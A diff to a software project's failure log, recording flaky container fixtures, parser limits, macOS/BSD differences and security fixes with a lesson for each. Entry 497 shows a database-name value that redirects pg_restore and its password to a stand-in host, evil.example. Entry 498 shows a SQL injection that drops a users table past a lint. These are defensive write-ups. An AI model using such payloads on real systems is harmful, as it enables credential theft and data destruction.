@@ -12261,3 +12261,532 @@ be told apart, because the wait reported only its last dial.
 
 **Fix.** Diagnosis first: `8fb70883` makes a timed-out greeting wait report Docker's bindings for the port, the port
 it was dialing, and whether a socket inside listens on it (from `/proc/net/tcp`). The next occurrence names its cause.
+
+## 471. The Postgres fixture's mapped port never answered while the server had logged ready (a repeat of 470) (open)
+
+**Symptom.** 2026-10-15, on the db branch, in a loop of five `internal/catalog/db/pg` runs (and once earlier the same
+day): the throwaway Postgres container logged "database system is ready to accept connections" twice, and
+testcontainers' `ForListingPort` check then dialed `localhost:<mapped>` 1,098 times over 120 s without one
+connection ("get state: context deadline exceeded"). The other six runs passed in about 18 s.
+
+**Root cause.** Not yet known, and the same shape as 470 on another image. Postgres logs that line only once it is
+listening, so "no server inside" is ruled out for this occurrence; host forwarding and a wrong host port remain.
+470's fix was diagnosis rather than a cure, and it covers the openssh fixture's wait alone: the Postgres fixture
+waits through testcontainers' own port check, which reports only that its deadline passed, so this occurrence could
+not say which of the two it was.
+
+**Fix.** None yet. What 470's diagnosis does for the openssh wait (Docker's bindings for the port, the port dialed,
+whether a socket inside listens) belongs in the Postgres fixture's wait too, so the next occurrence names its cause.
+
+**Lesson.** A diagnosis added to one fixture's wait does not cover a fixture that waits another way: when a class
+recurs, find every wait that can fail the same way, not only the one that failed first.
+
+## 472. file.yaml read every key behind a line comment as changed, because the comparison kept the comment
+
+**Symptom.** The config release gate's second run of an unchanged runbook reported `file.yaml` changed and rewrote
+the file each time. The key held the value asked for, `size: 4  # raised for the sale`.
+
+**Root cause.** The method compared the key's value before and after as text, and `docedit.YAMLText` encoded the
+node with its comments, so `4 # raised for the sale` never equalled `4`. Every unit test set a key with no comment.
+
+**Fix.** `fix(docedit): a YAML value compares without its comments`: `YAMLText` writes a deep copy with every
+comment removed; the document itself keeps them. `TestYAMLText_IgnoresComments` holds it.
+
+**Lesson.** An idempotence check is only proved by running the same thing twice against the shape real files have.
+A comment is the commonest thing a hand-edited YAML file holds, and it was the one shape the tests left out.
+
+## 473. yaml.v3 accepts a duplicate key when decoding into nodes, which pkg/docedit had to refuse itself
+
+**Symptom.** `TestYAML_Refuses` expected `ParseYAML("a: 1\na: 2\n")` to fail, and it succeeded.
+
+**Root cause.** `go.yaml.in/yaml/v3` refuses a duplicate mapping key when decoding into a map or a struct, and
+does not when decoding into `yaml.Node`, which is what an edit that keeps comments has to use. A file holding a key
+twice reads as one value to one program and another value to the next, so an edit could set the copy nobody reads.
+
+**Fix.** `pkg/docedit`'s `depth` walk refuses a mapping holding a scalar key twice, naming its line, before any
+edit. The JSON half refuses the same in its own parser.
+
+**Lesson.** A library's refusal is a property of one decoding path, not of the library: when switching to the
+node or token API for fidelity, re-check every refusal the value API gave for free.
+
+## 474. A fuzz target that started a server per input exhausted the ephemeral ports, and the "crash" was the harness
+
+**Symptom.** `FuzzAnthropicStream` failed with a bind error after a few seconds of fuzzing; `ss -s` then showed
+31,734 sockets in TIME_WAIT against a 28,000-port ephemeral range.
+
+**Root cause.** The fuzz body started an `httptest` server for each input. Every input cost a listening port and a
+closed connection in TIME_WAIT, so the machine ran out of ports long before the code under test did anything
+wrong.
+
+**Fix.** One server per fuzz process, answering with the current input over a reused connection; TIME_WAIT then
+held 4. Waited for the old TIME_WAIT sockets to drain before measuring again.
+
+**Lesson.** See LESSONS 285.
+
+## 475. gosec's taint analysis followed a CLI argument into a read and a write beside an arbitrary file (G703)
+
+**Symptom.** `make ci-remote` failed gosec on the ai branch: G703 at `ai_prompt.go`'s write of `<bundle>.sig`,
+and at the shared `readBounded` in `databaseconnection.go`, which had passed every earlier run.
+
+**Root cause.** `pleiades ai prompt sign <bundle>` read the path its argument named and wrote a signature beside it.
+The path was the operator's own, but nothing held it to the project, so a signature could be written beside any
+file the operator could name. The finding on `readBounded` was the same flow reaching an existing helper, which
+is why a file nobody had touched failed.
+
+**Fix.** `fix(cli): ai prompt sign signs only the project's own documents`: `sign` takes only a `.json` document
+inside the project (`--dir`), opened through an `os.Root`, and writes its signature through the same root. No
+waiver.
+
+**Lesson.** A new taint finding on an old helper points at its new caller: fix the flow at the caller, where the
+argument enters, rather than at the helper the analysis happened to report.
+
+## 476. The gate tests ran gate.run's own timeout command on the host, and macOS has none that takes -k (a repeat of 420) (fixed)
+
+**Symptom.** PR #59's `fast-macos` job failed 12 tests in `internal/catalog/gate`, every test that starts a check:
+"the device has no timeout command that takes -k and a duration (coreutils, or BusyBox 1.30 or later)". The Ubuntu,
+Windows and containers jobs passed, and the same tests pass on Linux.
+
+**Root cause.** The gate harness hands each command to a real `/bin/sh` on this machine, so the test device is the
+host. gate.run refuses a device whose timeout cannot bound a check, which is correct: the refusal is the product
+working. The harness assumed the host was that device, as 420's packages did.
+
+**Why 420's fix did not reach it.** 420 audited the packages that failed on the first macOS run. This package was new
+and had not run on macOS, so nothing had listed its host tools; its tests were written and passed on Linux only.
+
+**Fix.** The harness requires a timeout that takes `-k` through `testsupport.Require` before it starts, and says so in
+the skip reason. On macOS the twelve tests skip, and the ledger names why; the Linux release gate proves the real
+behavior.
+
+**Lesson.** A test that runs the product's own commands on the host has every host tool the product checks as a
+precondition. When a package's tests first run on a new platform, list the host tools they run and require each one,
+rather than waiting for the failing run to name them. This is 420's lesson, applied to the tests written after 420's
+audit.
+
+## 477. A release gate's fake server read its data while the test wrote it, with no lock (a repeat of 6 and 33) (fixed)
+
+**Symptom.** `go test -race ./cmd/pleiades/` reported `WARNING: DATA RACE` in `TestCLI_EdgeExampleReadsAndNamesEveryDifference`:
+the test wrote the fake Cloudflare server's maps (tunnel status, connectors, a record's proxied flag) between runs,
+while the server's handler goroutine read them. Nothing ordered the two.
+
+**Root cause.** `cfapitest.Server` locked its request log and nothing else, so its data was shared with the test's
+goroutine unguarded. The race was between the test and the handler, both in-process, so `-race` saw it and a plain run
+did not: it could pass for a long time.
+
+**Fix.** The server holds its lock for the whole handler, and a `Mutate` method runs a test's change under that lock.
+The gate test makes its changes through `Mutate`. Both packages pass under `-race`.
+
+**Lesson.** A fake server in a test is shared state like any other: when a test changes it while the server answers,
+the change goes through the server's lock. This is 6's and 33's lesson in a test fixture that was written after them.
+
+## 478. The gate's TCP precondition test made its closed endpoint by releasing a port (a repeat of 123, 177 and 183) (fixed)
+
+**Symptom.** None yet: found on 2026-10-15 by checking PR #59's whole diff against this index before pushing, at
+the owner's request. `TestRun_ATCPPreconditionIsTestedFromTheDevice` opened a listener on `127.0.0.1:0`, read its
+address, closed it, and asserted a check requiring that address skips.
+
+**Root cause.** The construction 123 named: a released port can be taken by any process, here most plausibly by the
+test SSH server's own forwards or a parallel package's listener, and then the "closed" endpoint answers.
+
+**Why 123's fix did not hold.** 123, 177 and 183 each fixed the sites they found, and 183's sweep found eight of
+ten. Nothing stops new code from writing the construction again, and this test was written after all three.
+
+**Fix.** `192.0.2.1:9` (TEST-NET-1, RFC 5737, never routed), with the probe's budget shortened to two seconds for
+this test through a test-only setter (`gate.SetProbeTimeout`, in `export_test.go`). Port 0, 123's other remedy, is
+refused by the manifest's own validation, which requires a port from 1 to 65535.
+
+The same check then found a second site in PR #59's diff, `remoteexec`'s forward-refusal test, which needs an
+endpoint that refuses rather than one that never answers. It takes `refusing.Addr` (`internal/testsupport/refusing`),
+a new helper: a loopback port bound by a socket that never listens, held until the test ends, so no other socket can
+take it and a dial to it is refused. Linux answers that dial with a reset. XNU does not: on the macOS CI runner the
+helper's own probe dial got "i/o timeout", so a refusal test there would have waited out its timeout. The helper
+dials its address once and skips (`needs refusing-port`) unless the dial is refused, which is what macOS then did,
+and the Linux CI jobs that set `PLEIADES_TEST_REQUIRE` require `refusing-port`. Its first home, `internal/testsupport`
+itself, was a defect of its own: 482.
+
+**Guard.** The follow-up branch `test/released-port-guard` adds `internal/archtest`'s
+`TestNoReleasedPortIsUsedAsAnAddress`, which parses every Go file and refuses a listener's address used after an
+explicit `Close` or returned from a function that closes it by `defer`. On its first run it found eight more sites,
+all moved onto `refusing.Addr`/`refusing.Port` there. A review then said a static guard sees only the shapes it was
+written for; a looser scan (any value closed, then read for `Addr` or `URL`) found an `httptest` server's `URL` used
+after `Close`, and once the guard modeled `httptest` servers it found a second such site the looser scan had missed,
+through a variable holding the URL. Both were fixed in the same PR, and the guard's doc comment lists what it still
+cannot see (a listener from a helper, a `net.ListenConfig`, a copy or a struct field; an address carried into another
+function). It also allows two helpers (`freeTCPPort` in the leader election release
+gate and in `tests/e2e`) allowed by name with their reasons: each hands the port to a subprocess that must bind it
+itself, so it cannot be held, and a taken port fails that subprocess loudly at startup.
+
+**Lesson.** See LESSONS 289: a class recorded here recurs in code written after its fix unless something checks
+new code for it. The pre-PR check against this index is that something, and for this class the guard now is too.
+
+## 479. The gate's parallelism test asserted an upper bound on elapsed time (a repeat of 211 and 422) (fixed)
+
+**Symptom.** None yet: found by the same pre-PR check. `TestRun_ParallelismRunsChecksTogether` asserted that two
+`sleep 1` checks with `parallelism: 2` finished in under two seconds.
+
+**Root cause.** A ceiling on wall-clock time, which a contended runner stretches: each check also opens SSH
+sessions, captures a process ID and preflights `timeout`, so under `-race` on two cores the margin is not a
+property of the code.
+
+**Fix.** Concurrency is proved by a rendezvous: each check touches its own mark and waits, up to 30 s, for the
+other's, so both pass only when both run at once, however slowly. The serial run keeps its lower bound (at least
+two seconds), which slowness can only lengthen.
+
+**Lesson.** A lower bound on time is safe under load; an upper bound is a contention test. Prove "together" by
+something only togetherness produces.
+
+## 480. The test SSH server's forward dialed with no bound, and Close waited for it (a repeat of 339 and 444) (fixed)
+
+**Symptom.** After 478's fix, the TCP precondition test took 134 s against a two-second probe budget. The product
+returned at two seconds; the test's cleanup did not.
+
+**Root cause.** `remoteexectest`'s `serveDirectTCPIP` called `net.Dial` with no deadline, and `Server.Close` waits for
+every channel's goroutine, so a forward to an address that drops packets held Close for the kernel's connect
+timeout. 339 and 444 were the same fixture holding Close on work with no end; their fixes bounded other paths.
+
+**Fix.** The forward dials with a context that ends when its SSH connection ends, as a real sshd abandons a pending
+connect. The test now takes two seconds; `pkg/remoteexec` and `internal/transport/ssh` pass under `-race`.
+
+**Lesson.** Anything a fixture's Close waits for needs an end of its own: a dial, a read, a copy.
+
+## 481. A Debian sshd fixture's mapped port never answered while sshd said it was listening (a repeat of 470 and 471) (open)
+
+**Symptom.** 2026-10-15, `make pr-check` on the gate branch: `TestCLI_PackageAndAccountMethodsReachARealDevice`'s
+container logged "Server listening on 0.0.0.0 port 22" and testcontainers' `ForListeningPort` dialed
+`localhost:<mapped>` 1,665 times over 3 m 15 s without a connection. It passed when re-run alone, and the gate
+tolerated it.
+
+**Root cause.** Unknown, as for 470 and 471: the third image showing the shape (openssh, Postgres, now a Debian
+sshd), each logging that its server listens while the host's mapped port never connects. 470's diagnosis covers the
+openssh fixture's own wait only; this one waits through testcontainers' check, which reports only its deadline.
+
+**Fix.** None yet. The next step stays 471's: give every fixture's wait the bindings-and-socket report 470 built.
+
+**Lesson.** Three images, one shape: the cause is below the images, in the host's port forwarding under load, and
+a report from inside the wait is how it will be found.
+
+## 482. A test of a package pkg/external reaches imported internal/testsupport, putting testcontainers-go into every external author's go.sum (fixed)
+
+**Symptom.** 2026-10-15, PR #59 at `5d4dc00c`: `fast-macos` failed `internal/forge/externalscaffold`'s
+`TestGenerate_ReleaseGate` with "the README's step "go mod tidy" failed offline", on
+`github.com/power-devops/perfstat: module lookup disabled by GOPROXY=off`, reached through
+`pkg/external imports pkg/remoteexec tested by pkg/remoteexec.test imports internal/testsupport imports
+testcontainers-go`. `fast` on Linux and a local `make pr-check` passed the same commit.
+
+**Root cause.** 478's fix gave `pkg/remoteexec`'s forward test `testsupport.RefusingAddr`. `go mod tidy` loads the
+tests of every package a program reaches, in other modules too, and the scaffolded external Collection reaches
+`pkg/remoteexec` through `pkg/external`, so its tidy now loaded `internal/testsupport`, which imports
+testcontainers-go. Every external Collection author's go.sum would have gained that whole module graph. The release
+gate tidies offline, so it failed wherever the module cache lacked one of the graph's platform-only modules: the macOS
+runner's cache did, the Linux runner's and this machine's held them all.
+
+**Fix.** `Require`'s implementation moved to `internal/testsupport/need`, which imports only the standard library,
+with `testsupport.Require` and `RequireEnv` delegating to it; the helper moved to `internal/testsupport/refusing`,
+built on `need`. Reproduced before fixing by setting perfstat aside from the local module cache: the release gate
+failed on the old import with the macOS error and passed on the fix. `internal/archtest`'s
+`TestExternalSDKTestsStayLight` now refuses a test, of any package of this module that `pkg/external` reaches, that
+imports anything reaching testcontainers-go; watched failing on a blank `internal/testsupport` import in that test.
+
+**Lesson.** See LESSONS 290: a test import in a package another module consumes is part of that module's graph, and
+a run on a warm module cache proves nothing about it.
+
+## 483. testcontainers' reaper container never became ready within its 60 s wait on a CI containers shard (open)
+
+**Symptom.** 2026-10-16, PR #59's `containers (3)` at `3dd1a48c`: `internal/runner`'s
+`TestDedupKeyRoundTripsThroughARealBucket` failed after 61 s with "starting a NATS broker: create container:
+reaper: from container "026843a5": wait for reaper 026843a5: context deadline exceeded". It passed when re-run
+alone, so the job tolerated it. The same run's `containers (1)` tolerated `TestGrandIntegration_EachKindReachesItsOwnAdapter`
+(a job still "running" past its budget), 61's named repeat offender.
+
+**Root cause.** Unknown. The failing step is testcontainers-go's own reaper (Ryuk), which each test binary starts
+once before its first container, and whose readiness wait is fixed at 60 s; the NATS container itself was never
+reached. Nothing in this repository's code runs before that wait, so the cause is the runner's Docker daemon at that
+moment, not the test.
+
+**Fix.** None yet. If it recurs, the evidence to collect is the daemon's state at the deadline (the reaper container's
+own log and `docker ps -a`), which testcontainers does not print; a repeat across runs would justify having the
+container shards start the reaper image ahead of the tests.
+
+**Lesson.** A tolerated failure in a step no test code reaches is still worth a line: it is the only way a recurrence
+will be recognised as one.
+
+## 484. A Cargo.toml nested a megabyte deep ended the process: go-toml recurses with no limit (a repeat of 62) (fixed)
+
+**Symptom.** Found 2026-10-16 by the pre-PR failure-pattern check of the build branch, then reproduced: go-toml v2.2.4
+fed `a=` and one million `[` died with "goroutine stack exceeds 1000000000-byte limit", which no recover catches. A
+Cargo file on a device could end `pleiades run`, or the Runner's task child.
+
+**Root cause.** 62's class in a dependency: a recursive parser whose depth is the input's nesting, with no bound.
+62's fix bounded this repository's own recursion; nothing checked a new parser's.
+
+**Fix.** `pkg/lockcheck.checkTOMLNesting` counts array and inline-table nesting the way TOML's grammar reads it
+(comments and all four string kinds skipped) and refuses past 100 before go-toml reads the file. yaml/v3 and
+encoding/json were checked the same way and stop at 10000 themselves.
+
+**Lesson.** A new parser of device data gets the nesting test before it is trusted: a megabyte of the opening
+bracket.
+
+## 485. Lockfile readers matched keys regardless of case, so a "Resolved" replaced the source npm fetches from (a repeat of 325) (fixed)
+
+**Symptom.** Found by the same check: `encoding/json` matches a key to a struct field regardless of case, and go-toml
+falls back to the same, so `"Resolved"` after `"resolved"` hid a source off the allowed list, `"Link"` skipped an
+entry npm installs, and a Cargo `SOURCE` replaced `source`. Six cases, each watched failing.
+
+**Root cause.** 325's class: Go's decoders are case-insensitive, and the readers of record (npm, Cargo) are not.
+325's fix was for runbooks; the lockfile readers were written after it.
+
+**Fix.** npm's lockfile, entries and manifest decode by exact key through a raw map; Cargo's files decode into maps,
+whose keys go-toml keeps as written.
+
+**Lesson.** Decoding data another program reads into a Go struct inherits encoding/json's case folding; read by
+exact key whenever a mismatch would be a security answer.
+
+## 486. The build-file reader saw less than a build does: heredocs at any "<<", one ARG scope, merge keys and aliases unfollowed, duplicate keys kept (a repeat of 473 and 332) (fixed)
+
+**Symptom.** Found by the same check, each a test watched failing: `RUN echo $((1<<X))` hid every later FROM; a
+stage `ARG BASE=pinned` changed what a later `FROM ${BASE}` read while Docker reads the global ARG; a Compose image
+from `<<: *base` was never seen; yaml/v3 kept both values of a duplicated `image`. `build.digests.check` could pass
+a file whose build pulls an image it never saw. One ARG used by two FROMs also made a refresh fail "edits overlap".
+
+**Root cause.** 473's and 332's class: a reader of a format that is a subset of what the real consumer (BuildKit,
+Compose) reads, so the check and the build disagree.
+
+**Fix.** BuildKit's own heredoc test, two ARG scopes, merge keys and aliases followed, duplicate keys refused, one
+reference per byte range. `docs/design/build.md` states each.
+
+**Lesson.** A checker is only as strict as the difference between what it reads and what the build reads; write
+the consumer's rules down and test each against the consumer's behavior.
+
+## 487. A failed refresh dropped the undo record that the files it could not put back needed (a repeat of 452) (fixed)
+
+**Symptom.** Found by the same check: `build.digests.refresh` dropped its undo record after any failed write, even
+when it reported files it could not put back, which were then changed with nothing able to restore them.
+
+**Root cause.** 452's class: an undo discarded on the failure path, where it matters most.
+
+**Fix.** The record is dropped only when every file is what it was; otherwise the error names it and the replay.
+A replay skips a line that already holds what it would write (a file the failed run never reached). Proven with a
+test-only hook that fails the put-back between two writes.
+
+**Lesson.** On a failure path, ask what can still restore the state; never drop it until the answer is nothing.
+
+## 488. containerengine's "set engine:" advice named a parameter no method declared, so validate refused it (a repeat of 270 and 324) (fixed)
+
+**Symptom.** Found by the same check: on a device running Docker and Podman, `containerengine.Open` asks for
+`engine:`, and `ParamsRule` refused the task for an undeclared parameter, saying the method "would ignore it",
+which it would not. `gate.run`, merged in #59, and both `build.digests` methods could not run on such a device.
+
+**Root cause.** 270's and 324's classes together: advice naming a key, and a validator refusing keys a method does
+not declare, with nothing tying the two.
+
+**Fix.** A shared fragment, `container_engine`, declares `engine`; the three methods name it; ParamsRule's test
+passes it to each.
+
+**Lesson.** A refusal that tells a user to set a parameter needs a test that sets it through the whole path,
+validation included.
+
+## 489. Fuzz targets fuzzed their selector string, so almost every input stopped at "unknown" and a panic went unfound (a repeat of 35) (fixed)
+
+**Symptom.** Found by the same check: `FuzzExtract` and `FuzzVerify` took the kind or format as a fuzzed string, so
+mutations nearly always returned "unknown kind" first. Fixed to pick a real kind by index, `FuzzExtract` found in
+seconds a panic a bare final `FROM` caused, which predated the change.
+
+**Root cause.** 35's class in a quieter form: the target calls the code, but its input distribution almost never
+reaches it.
+
+**Fix.** Both targets pick a registered kind or format by index, and FuzzExtract also checks that writing every
+reference back as it was changes nothing. The crashing input is kept under testdata/fuzz.
+
+**Lesson.** Fuzz the data, not the switch that chooses the code path.
+
+## 490. A line count from the file's start for every reference made a 1 MiB Compose file take 53 s (a repeat of 48) (fixed)
+
+**Symptom.** Found by the same check and measured: 40,000 references in one 1 MiB file took 53 s per read, and a
+refresh reads up to 200 files.
+
+**Root cause.** 48's class: per-item work proportional to the whole input.
+
+**Fix.** A line index built once per file; 67 ms. `BenchmarkExtract_ManyReferences`, run against both.
+
+**Lesson.** A helper that takes the whole input and an offset is quadratic when called per item; index once.
+
+## 491. The release gate's checked refresh asserted only what it left alone (a repeat of 467) (fixed)
+
+**Symptom.** Found by the same check: the gate's check step passed with `CheckRefresh` returning "changed" and
+doing nothing.
+
+**Root cause.** 467's class, written again after it.
+
+**Fix.** The step now asserts both predicted changes, from tag to served digest, marked predicted; watched failing
+on that mutation.
+
+**Lesson.** As 467's.
+
+## 492. ReadText's output bound also held standard error, so an unreadable file was reported as too large (fixed)
+
+**Symptom.** A new coverage test of `remotefile.ReadText` on a mode-000 file got "is over the 64 bytes this reads":
+cat's "Permission denied" message tripped the bound.
+
+**Root cause.** `RunWithStdinBounded` holds each stream to the limit, and ReadText read every ErrOutputTooLarge as the
+file being large.
+
+**Fix.** ReadText refuses a file over the bound by Stat's size before reading, gives the read room for cat's
+message, and calls output past the bound a file that grew while read.
+
+**Lesson.** When a bound covers more than one stream, the error that trips it does not say which.
+
+## 493. gofmt turned the '' inside ''' in a doc comment into a typographic quote (fixed before push)
+
+**Symptom.** A doc comment naming TOML's multi-line literal delimiter came out of `gofmt -w` as `(”')`.
+
+**Root cause.** Go doc comment formatting rewrites a pair of single quotes (and a pair of backquotes) into
+typographic quotes.
+
+**Fix.** The comment names the delimiter in words. A grep for non-ASCII bytes in the package found nothing else.
+
+**Lesson.** In a Go doc comment, never write two single quotes in a row; say it in words or put it in code.
+
+## 494. chmod MODE -- FILE works on GNU and fails on BSD, twice: build's undo directory and scpxfer's put (a repeat of 420 and 476) (fixed)
+
+**Symptom.** 2026-10-16, PR #61's `fast-macos`: every build.digests.refresh test failed with "chmod: --: No such
+file or directory" while preparing the undo directory. Looking for the class, the same shape turned up in
+`pkg/scpxfer`'s put script on main since 2026-09-23: every SCP copy that sets a mode fails on a macOS or FreeBSD
+device. No CI job had run that one on BSD at all; its tests use Docker sshd, on Linux.
+
+**Root cause.** GNU getopt permutes arguments, so an option after an operand is still an option; BSD's stops at
+the first operand, so `--` after the mode is a file name. 420 and 476 were the same assumption (a Linux userland);
+neither the pre-PR check nor the delegated review saw it, since a Linux run accepts the command and a reading of
+the code finds nothing wrong with it unless it knows the BSD parse.
+
+**Fix.** `--` before the mode in both. And the class, not just the instances: the SSH test harness
+(`remoteexectest`) runs every command with `POSIXLY_CORRECT=1`, which makes GNU getopt stop at the first operand
+as BSD's does, so every Linux test of a command a device runs checks the BSD parse. Across the 40 packages that use
+the harness it failed exactly these two and nothing else.
+
+**Lesson.** A platform difference a Linux machine can be made to show is a harness setting, not a review
+checklist item. What it cannot show (a missing `timeout -k`, a different `stat`) still needs a real macOS run
+before the push, which a pull request's `fast-macos` is too late for.
+
+## 495. The reaper's end-to-end test failed on a shared-cache test database the Controller does not use (a repeat of 469) (fixed)
+
+**Symptom.** 2026-10-16, #61's `fast-macos`, in the strict repeat: "the reaper's republish never moved the job out of
+fanning_out", after "database table is locked: jobs" on both the claim and the settle.
+
+**Root cause.** `internal/dispatch`'s test store was in-memory shared-cache SQLite, which answers two connections
+writing one table with SQLITE_LOCKED at once; the Controller's database is a file in WAL mode with a busy timeout,
+which waits. Once the settle failed the job was freshly claimed, so not stale for an hour, and nothing could finish
+it. 469 fixed the test's reading of the outcome and named the shared cache in a comment, but kept it.
+
+**Fix.** Reproduced on a real Mac (Apple M4, `make mac-check`'s machine) with eight copies at once: 6 failures in
+200 runs. The test store now opens the database through `ent.OpenDatabase`, the Controller's own path, migrations
+included: 0 in 200. Branch `fix/reaper-test-store`.
+
+**Lesson.** A test store that is not the production configuration fails in ways production does not, and its
+comments explaining the difference are the clue; replace the store, not the assertion.
+
+## 496. The Grand Integration runbook job stayed "running" for its whole budget twice in one CI job (a repeat of 61) (open)
+
+**Symptom.** #61's `containers (1)` at `64f1a959`: `TestGrandIntegration_EachKindReachesItsOwnAdapter`'s `noop`
+runbook job never left "running" in 300 s, under load and again re-run alone. The same commit passed locally in 16 s
+against real Docker, and on a fresh runner the job passed with no re-run.
+
+**Root cause.** Unknown. The stuck job is the `noop` runbook, which reaches no device, so nothing #61 changed is in
+its path. A runner that stays slow for a whole job (both failures were on one runner) is the leading reading.
+
+**Fix.** None yet. If it recurs, the Runner's own output for the stuck dispatch is the evidence to keep; the
+harness prints the Controller's, not the Runner's.
+
+**Lesson.** A failure that repeats alone on one runner and not on another is still worth a line; two samples are
+how it was told from a code change here.
+
+## 497. pg_restore read the database name as a connection string, so a name could send the restore and its password to another host (a repeat of 450 and 148) (fixed)
+
+**Symptom.** Found 2026-10-16 by the pre-pull-request review of `db.pg`: `db.pg.restore` ran
+`pg_restore --dbname=<database>`. pg_restore reads `--dbname` as a libpq connection string whenever the value holds
+`=` or begins with a URI prefix, so `database: "host=evil.example sslmode=disable dbname=x"` with `create: true`
+made that literal database on the real server, then had pg_restore connect to evil.example with the exported
+password and TLS off. On the old code a name `dbname=app o'b\x` failed with "missing = after o'b\x".
+
+**Root cause.** 450's class in a new shape: a value reaching a command as data where the command parses it as
+options. The name check refused control characters and length only; nothing knew `--dbname` is itself a parser.
+
+**Fix.** Both tools take the name as the dbname of a connection string naming nothing else, quoted
+(`dbname='...'`, `\` and `'` escaped), so host, port, user and TLS always come from the exported settings. The
+release test restores into a database literally named `dbname=app o'b\x` and reads it back.
+
+**Lesson.** An argument that is itself a mini-language (a connection string, a URL, a format string) is an
+injection surface even after `--` and equals form; hand it over in the form that can only mean the one value.
+
+
+## 498. The additive-only lint read string literals one way and the server another, so a DROP ran inside what the lint saw as one INSERT (fixed)
+
+**Symptom.** Found 2026-10-16 by the review; proven on the old code: a migration
+`INSERT INTO n VALUES ('it\''); DROP TABLE users; --');` after a file running `SET standard_conforming_strings =
+off` passed `additive_only` and dropped `users`.
+
+**Root cause.** `pkg/sqllint` lexes a backslash in `'...'` literally, as `standard_conforming_strings = on` does;
+a session with it off (a role or database setting, or an earlier file) reads `\'` as an escaped quote, so the
+server split the text into an INSERT and a DROP where the lint saw one INSERT. The lint also had no answer for
+statements whose effect it cannot read (`DO`, `CALL`, `EXECUTE`, `SELECT f()`), and passed them.
+
+**Fix.** `pkg/pgclient` pins `standard_conforming_strings=on` (with the encoding and date style) at startup;
+migrate checks the setting before each file (the server lexes a whole file before running any of it, so between
+files is enough); and the additive-only judgement fails closed on what it cannot read, waived per file with a
+reason.
+
+**Lesson.** A checker and the system it guards must parse with the same settings, pinned by the checker; a rule
+that reads text must refuse what it cannot read rather than pass it.
+
+
+## 499. The device tools carried the database password in their environment, which PostgreSQL's own documentation advises against (fixed, by the owner's decision)
+
+**Symptom.** Left open by #64's review as 251's class: the device's script exported `PGPASSWORD`, so `pg_dump`,
+`timeout`, `ln` and anything the tool started held it in their environment. On Linux the same user reads
+`/proc/<pid>/environ` (shown here with Yama's ptrace scope at 1); on the owner's Mac (macOS 27) a same-user `ps -E`
+did not show it.
+
+**Root cause.** "Never on a command line" was taken to mean "not observable"; libpq's documentation says
+`PGPASSWORD` "is not recommended for security reasons" and recommends a password file.
+
+**Fix.** The owner chose PostgreSQL's guidance (Ansible's postgresql_db uses PGPASSWORD; Salt and systemd's
+credentials use files). The script makes its private directory (under `XDG_RUNTIME_DIR` where there is one) and
+its trap first, then writes the `*:*:*:user:password` line there with the shell's built-in printf, and exports
+`PGPASSFILE`. A wrapper ahead of the real pg_dump proves no password in its environment, a `-rw-------` file, and
+nothing left after. docs/10 states what remains: the login user and root can read the file during the run.
+
+**Lesson.** State a secret's exposure as who can read it, how, and for how long, then compare options on those
+three; "not on the command line" answers only one of them.
+
+
+## 500. remoteexec's stdin-closing test helper assumed a harness that waited for input, written in the same commit that made it stop waiting (a repeat of 460) (fixed)
+
+**Symptom.** #64's `fast` job, third strict repeat: `TestProcess_WaitReportsNonZeroExitAsStatusNotError`
+"CloseWrite() error = ... EOF". The package was otherwise untouched by the branch. Under `-race` on one CPU it
+failed 886 of 900 runs across the helper's three callers.
+
+**Root cause.** `closeStdin`'s comment said the harness reports no exit until stdin ends; commit `662ffb17`, which
+wrote it, also made the harness end the session when the command ends, as sshd does. For a command that reads no
+input the channel can be closed before the test closes its input, and x/crypto answers `io.EOF`.
+
+**Fix.** The helper accepts `io.EOF` (the channel already closed, the input as closed as it can be) and fails on
+anything else; the same 900 runs pass.
+
+**Lesson.** A helper's comment is a claim about its harness; when the harness changes in the same commit, test the
+helper against the new behavior, under `-race` on one CPU, where ordering races show.
+
+
+## 501. The hop stress test opened more connections at once than one macOS listener holds, and XNU resets the rest (a repeat of 476's class) (fixed)
+
+**Symptom.** 2026-10-16, `make mac-check` on the owner's MacBook Air (first run of `pkg/remoteexec` there):
+`TestConnect_HopChain_StressManyConcurrentSessions` lost 136 to 167 of 300 sessions to "connection reset by peer".
+CI's macOS runner passes it.
+
+**Root cause.** XNU resets connections past what a listener's queue holds, where Linux drops a SYN it has no room
+for and the client sends it again. TCP counters' "listen queue overflow" stayed 0, so it is counted elsewhere.
+Measured with `kern.ipc.somaxconn` 128: 128 sessions passed every run, alone and with the package at `-count=3`;
+192 failed under load; 300 every run.
+
+**Fix.** The test opens `min(300, listenQueue())` at once: `kern.ipc.somaxconn` on darwin, unbounded elsewhere.
+
+**Lesson.** A stress test's load must fit the platform's own limits or it tests the kernel; size it from the
+platform rather than skip it there, and measure the threshold on the platform before choosing.
+
